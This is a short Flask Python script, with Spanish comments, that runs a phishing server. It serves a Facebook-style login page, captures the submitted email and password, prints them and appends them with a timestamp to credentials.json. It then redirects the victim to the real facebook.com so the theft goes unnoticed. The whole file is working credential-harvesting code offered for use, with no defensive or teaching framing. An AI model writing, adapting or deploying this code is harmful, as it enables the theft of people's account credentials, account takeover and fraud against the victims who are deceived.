from flask import Flask, request, render_template
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return render_template('facebook_login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')

    print("---------- Credenciales recibidas ----------")
    print(f"Email: {email}")
    print(f"Password: {password}")
    print("------------------------------------------")
    
    # Crear un diccionario con los datos
    data = {
        'email': email,
        'password': password,
        'fecha': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    # Guardar en archivo JSON 
    try:
        with open('credentials.json', 'a') as f:
            json.dump(data, f)
            f.write('\n')
    except Exception as e:
        print(f"Error guardando datos: {e}")
    
    # Redireccionar a Facebook real
    return '<script>window.location.href="https://www.facebook.com";</script>'

if __name__ == '__main__':
    app.run(debug=True)
